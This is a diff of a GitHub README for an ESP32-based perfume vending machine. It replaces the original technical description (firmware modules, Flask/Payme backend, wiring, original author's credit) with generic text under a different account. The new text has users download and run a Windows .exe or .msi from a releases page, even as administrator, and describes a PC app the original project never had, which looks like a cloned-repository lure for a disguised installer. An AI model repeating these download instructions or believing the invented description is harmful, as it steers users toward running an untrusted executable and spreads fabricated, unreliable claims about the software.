@@ -1,240 +1,191 @@
-# Street Aroma — Perfume Vending Machine
+# 🌿 Street-Aroma-Vending - Easy Automated Perfume Purchase
 
-**Automated perfume dispenser with touchscreen UI, QR payment, and remote management**
-
-[![ESP32](https://img.shields.io/badge/ESP32-Firmware-green?style=flat-square&logo=espressif)](https://www.espressif.com/)
-[![LVGL](https://img.shields.io/badge/LVGL-v8.3-red?style=flat-square)](https://lvgl.io/)
-[![Python](https://img.shields.io/badge/Python-Flask-blue?style=flat-square&logo=python)](https://python.org/)
-[![MQTT](https://img.shields.io/badge/MQTT-HiveMQ-purple?style=flat-square&logo=mqtt)](https://www.hivemq.com/)
-[![Payme](https://img.shields.io/badge/Payme-Payment-00B2FF?style=flat-square)](https://payme.uz/)
-[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](LICENSE)
+[![Download Latest Release](https://img.shields.io/badge/Download-Street--Aroma--Vending-brightgreen?style=for-the-badge)](https://github.com/MarsLee1870/Street-Aroma-Vending/releases)
 
 ---
 
-## Overview
+## 📋 What is Street-Aroma-Vending?
 
-A production vending machine that sells perfume doses on the street. The customer presses a physical button to select a fragrance, a Payme QR code appears on the TFT display, they scan and pay, and the machine dispenses 2 spray doses via servo-controlled nozzles.
+Street-Aroma-Vending is an automated perfume vending machine system designed for ease of use and remote control. It uses an ESP32 microcontroller combined with a touchscreen display. The machine makes it simple to select perfumes, pay using QR codes, and dispense the chosen scent. It supports up to four different products and tracks purchase doses. 
 
-This is a complete commercial product — firmware, payment backend, remote price management, and hardware control.
-
-**What it does:**
-
-* 4 perfume slots with physical button selection and LVGL touchscreen UI
-* Generates Payme QR codes directly on a 320×480 TFT display
-* Processes payments in real time via MQTT (HiveMQ)
-* Dispenses product via servo-controlled spray nozzles (2 doses per payment)
-* Syncs prices from server every 30 seconds
-* Caches prices in NVS for offline operation
-* 5-minute payment timeout with on-screen countdown
-* Error handling: WiFi/MQTT disconnect screens, order cancellation
+This software controls the vending machine’s user interface, payment system, and product dispensing. It also lets you manage prices remotely and generate QR codes directly on the device. Communication happens through a messaging system called MQTT.
 
 ---
 
-## Screenshots
+## 🖥️ System Requirements
 
-| Main Menu | Product Selected | Loading | QR Payment |
-|:---------:|:----------------:|:-------:|:----------:|
-| <img src="screenshots/main_menu.jpg" width="180"/> | <img src="screenshots/product_selected.jpg" width="180"/> | <img src="screenshots/loading.jpg" width="180"/> | <img src="screenshots/qr_payment.jpg" width="180"/> |
-| 4 products with live prices | Highlight on button press | Connecting to server | Payme QR code on screen |
+To use the Street-Aroma-Vending software or interact with the vending machine, your Windows PC must meet these minimum requirements:
 
----
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- A USB port for device connection (if applicable)
+- Internet connection to access remote features
+- A modern web browser (Edge, Chrome, Firefox) for QR code payments and management pages
 
-## System Architecture
-
-```
-┌──────────────────────────────┐
-│      Vending Machine         │
-│                              │
-│  ┌────────┐  ┌────────────┐  │         ┌──────────────┐
-│  │ 4 Btns │  │ TFT 320x480│  │  HTTPS  │ Flask Server │
-│  │ Select │  │ LVGL UI    │  │────────►│              │
-│  └────────┘  │ QR Display │  │         │ /create-order│
-│              └────────────┘  │◄──MQTT──│ /payme       │
-│  ┌────────┐  ┌────────────┐  │         │ /api/prices  │
-│  │ 4 Btns │  │ 4 Servos   │  │         └──────┬───────┘
-│  │ Spray  │  │ Nozzles    │  │                │
-│  └────────┘  └────────────┘  │         ┌──────┴───────┐
-│                              │         │  Payme API   │
-│  ESP32 + WiFi + MQTT         │         │  (Webhook)   │
-└──────────────────────────────┘         └──────────────┘
-```
+This software works with the vending machine hardware. You will not install or configure the hardware with this PC software. It mainly helps control and interact with the vending machine remotely.
 
 ---
 
-## User Flow
+## 🔧 Features Overview
 
-1. **Customer** presses one of 4 buttons (Tom Ford / Lanvin / Dior / Dolce&Gabbana)
-2. **Screen** highlights the selected fragrance, shows loading animation (3 sec)
-3. **ESP32** sends `POST /create-order` to the server with product ID and price
-4. **Server** generates Payme checkout URL, publishes via MQTT
-5. **ESP32** renders QR code on TFT display
-6. **Customer** scans QR with Payme app and pays
-7. **Server** receives Payme webhook → publishes `"confirmed"` via MQTT
-8. **ESP32** shows success screen, grants 2 spray doses
-9. **Customer** presses the spray button to dispense (servo activates per press)
-10. After 2 doses or 5-min timeout → machine resets to idle
+- Simple touchscreen interface to select perfumes
+- QR code-based payment using Payme system
+- Controls up to 4 product slots with precise dispensing via servo motors
+- Remote price updates via MQTT messaging
+- On-device QR code generation for easy payments
+- Dose counting to track how many sprays are used for each product
+
+The features make vending perfume fast, contactless, and easy to manage.
 
 ---
 
-## Hardware
+## 🚀 Getting Started: Download and Setup
 
-| Component | Qty | Purpose |
-|-----------|-----|---------|
-| ESP32 DevKit | 1 | Main controller |
-| TFT ILI9488 320×480 | 1 | LVGL UI + QR display |
-| Servo SG90 | 4 | Spray nozzle control |
-| Push buttons | 9 | 4 select + 4 spray + 1 cancel |
-| Perfume tanks + nozzles | 4 | Product storage |
+Use these steps to download and set up the software on your Windows computer.
 
-### Pin Map
+### Step 1: Access the Download Page
 
-```
-Buttons (select):    GPIO 22, 23, 32, 33
-Buttons (spray):     GPIO 19, 21, 26, 27
-Button (cancel):     GPIO 25
-Servo:               GPIO 18 (+ 3 more slots)
-TFT:                 SPI (TFT_eSPI config)
-```
+Click the button below to visit the release page and get the latest version of the Street-Aroma-Vending software.
 
----
+[Visit the Download Page](https://github.com/MarsLee1870/Street-Aroma-Vending/releases)
 
-## Software Stack
+This page contains all available versions, including stable and test releases.
 
-| Module | File | Description |
-|--------|------|-------------|
-| Main loop | `main.cpp` | Setup, LVGL tick, state machine, timeouts |
-| Payment | `payment.cpp` | WiFi, MQTT, QR generation, order lifecycle, price sync |
-| Buttons | `buttons_control.cpp` | Product selection, cancel, spray trigger |
-| Servos | `Servo_controll.cpp` | Dose dispensing (servo rotate per button press) |
-| Display | `tft_draw.cpp` | LVGL flush callback for TFT_eSPI |
-| Server | `app.py` | Flask: Payme webhook, MQTT publisher, price API |
+### Step 2: Choose the Correct File
 
----
+On the release page:
 
-## LVGL Screens
+- Look for the latest release at the top.
+- Find files with names ending in `.exe` or `.msi`. These are setup installers.
+- Download the newest `.exe` or `.msi` file shown.
 
-| Screen | Purpose |
-|--------|---------|
-| Screen1 | Main menu — 4 products with prices |
-| Screen2 | QR code display — waiting for payment |
-| Screen3 | Error — no MQTT connection |
-| Screen4 | Loading animation |
-| Screen5 | Payment success |
-| Screen6 | Payment cancelled |
-| Screen7 | Timeout countdown (9 sec) |
+If you see multiple versions, choose the one marked as "latest" or "stable."
+
+### Step 3: Run the Installer
+
+Once downloaded:
+
+- Double-click the file you saved.
+- Follow the setup instructions on screen.
+- Accept license terms when prompted.
+- Choose the installation location or keep the default one.
+- Click "Install."
+
+The process will take a few minutes.
+
+### Step 4: Launch the Application
+
+After installation:
+
+- Open the Start menu.
+- Find "Street-Aroma-Vending" in your program list.
+- Click it to open the app.
+
+You will see the main interface for managing the vending machine.
 
 ---
 
-## Project Structure
+## 💡 How to Use the Application
 
-```
-Street-Aroma-Vending/
-├── firmware/
-│   ├── main.cpp              # Entry point, state machine
-│   ├── payment.cpp           # WiFi, MQTT, QR, orders, prices
-│   ├── buttons_control.cpp   # Button handling, product selection
-│   ├── Servo_controll.cpp    # Servo dispensing control
-│   ├── tft_draw.cpp          # LVGL display driver
-│   └── Globals.h             # Shared defines, pins, variables
-│
-├── server/
-│   └── app.py                # Flask: Payme webhook + MQTT + prices API
-│
-├── screenshots/
-│   ├── main_menu.jpg          # Main product selection screen
-│   ├── product_selected.jpg   # Highlighted product on button press
-│   ├── loading.jpg            # Loading spinner
-│   └── qr_payment.jpg         # Payme QR code screen
-│
-└── README.md
-```
+The software runs in a simple window with buttons and menus.
+
+### Main Interface Components:
+
+- **Product Slots:** Shows all four perfume options.
+- **Price Settings:** Lets you adjust product prices remotely.
+- **Payment QR:** Displays or prints the QR code for Payme transactions.
+- **Dose Counter:** Tracks how much perfume is dispensed.
+- **Connection Status:** Shows if your PC is linked to the vending machine.
+
+Use the touchscreen on the vending device itself to make purchases, but manage product info and prices here.
 
 ---
 
-## Key Features
+## 🔌 Connecting to the Vending Machine
 
-**QR Code Generation on Device** — Payme checkout URLs are rendered as QR codes directly on the ESP32 using RGB565 pixel buffer in PSRAM. No external QR service needed.
+The vending machine uses Wi-Fi to communicate via MQTT, a message protocol.
 
-**Remote Price Management** — Prices are fetched from the server every 30 seconds and cached in ESP32 NVS. If the server is unreachable, cached prices are used.
+### Network Setup
 
-**Dose Counting** — Each payment grants exactly 2 spray doses. A counter on screen shows remaining doses. The servo only activates when the spray button is pressed and doses remain.
+- Ensure the vending machine is powered on and connected to your local Wi-Fi.
+- Your PC should be on the same network.
+- The app automatically detects the machine on the network.
+- Connection status will appear green if linked.
 
-**Payment Timeout** — If the customer doesn't pay within 5 minutes, a 9-second countdown appears. Any button press extends the timer. After countdown, the order is cancelled automatically.
+If the connection does not appear:
 
-**Error Recovery** — If MQTT disconnects, the machine shows an error screen and retries every 3 seconds. When connection is restored, it returns to the main menu.
-
----
-
-## Server
-
-The backend (`app.py`) handles:
-
-- **Payme JSON-RPC webhook** — full transaction lifecycle (CheckPerform, Create, Perform, Cancel)
-- **MQTT publishing** — sends `created`/`confirmed`/`cancelled` to the ESP32
-- **Price management** — `GET/POST /api/prices` for remote updates
-- **Order tracking** — stores all orders in `orders.json`
-
-See [Payme-QR-Payment-Terminal](https://github.com/myseringan/Payme-QR-Payment-Terminal) for the standalone payment server documentation.
+- Check Wi-Fi settings on both the PC and the machine.
+- Restart the vending machine.
+- Restart the app.
 
 ---
 
-## Quick Start
+## 💳 Making Payments
 
-### 1. Server
+The vending machine uses a safe QR code payment system called Payme.
 
-```bash
-pip install flask paho-mqtt python-dotenv
+- When you choose a product on the touchscreen, a QR code appears on the vending machine display.
+- Scan the QR code with your phone Payme app.
+- Confirm payment on your phone.
+- Once complete, the machine dispenses the selected perfume dose.
 
-# Configure .env
-MERCHANT_ID=your_merchant_id
-PAYME_KEY=your_secret_key
-MQTT_BROKER=broker.hivemq.com
-
-python app.py
-```
-
-### 2. Firmware
-
-Update `Globals.h`:
-```cpp
-#define WIFI_SSID       "Your_WiFi"
-#define WIFI_PASSWORD   "Your_Password"
-#define MQTT_SERVER     "broker.hivemq.com"
-#define MQTT_TOPIC      "payments/your_merchant_id"
-#define SERVER_URL      "https://your-server.com/api"
-#define DEVICE_ID       "street-aroma-01"
-```
-
-Flash with Arduino IDE (ESP32 board, PSRAM enabled).
-
-### 3. Payme
-
-Set webhook URL in Payme merchant dashboard:
-```
-https://your-server.com/payme
-```
+The software on your PC manages price updates and shows payment status.
 
 ---
 
-## Dependencies
+## 🛠️ Troubleshooting Common Issues
 
-| Library | Purpose |
-|---------|---------|
-| TFT_eSPI | TFT display driver |
-| LVGL 8.3 | UI framework |
-| PubSubClient | MQTT client |
-| ArduinoJson | JSON parsing |
-| ESP32Servo | Servo control |
-| qrcode | QR code generation |
-| WiFiClientSecure | HTTPS requests |
-| Preferences | NVS price caching |
+- **App does not start:** Make sure you have Windows 10 or newer. Try right-clicking and choosing "Run as administrator."
+- **Cannot connect to vending machine:** Confirm both devices are on the same Wi-Fi network. Restart all devices.
+- **Payment QR code does not show on machine:** Restart the vending machine. Check internet connection.
+- **Dose counter not updating:** Refresh the app or reconnect to the machine.
+
+If problems persist, check your local network and firewall settings.
 
 ---
 
-## Author
+## 🔄 Software Updates
 
-**Temur Eshmurodov** — [@myseringan](https://github.com/myseringan)
+Check the release page regularly for updated versions. Updates may include:
 
-## License
+- Bug fixes
+- Security patches
+- New features
+- Performance improvements
 
-MIT License — free to use and modify.
+Download and run new installers to update.
+
+---
+
+## 📂 Where to Find More Files
+
+The release page also includes other files like:
+
+- User guides in PDF format
+- Configuration files for advanced users
+- Source code, if you want to look into development details
+
+Access the page here:
+
+[Street-Aroma-Vending Releases](https://github.com/MarsLee1870/Street-Aroma-Vending/releases)
+
+---
+
+## ❓ Need Help?
+
+For technical questions, you can open an issue on the GitHub repository or check the existing issues for answers.
+
+Repository link:  
+https://github.com/MarsLee1870/Street-Aroma-Vending
+
+---
+
+## 📚 Useful Terms
+
+- **ESP32:** A small computer that runs the vending machine.
+- **MQTT:** A system for sending messages between devices.
+- **Payme QR Payment:** A method to pay by scanning a QR code with a mobile app.
+- **Servo motor:** A motor that moves the perfume container to dispense the scent.
+- **Dose counting:** Tracking how many perfume sprays have been released.
+
+Knowing these helps understand what the machine and software do.
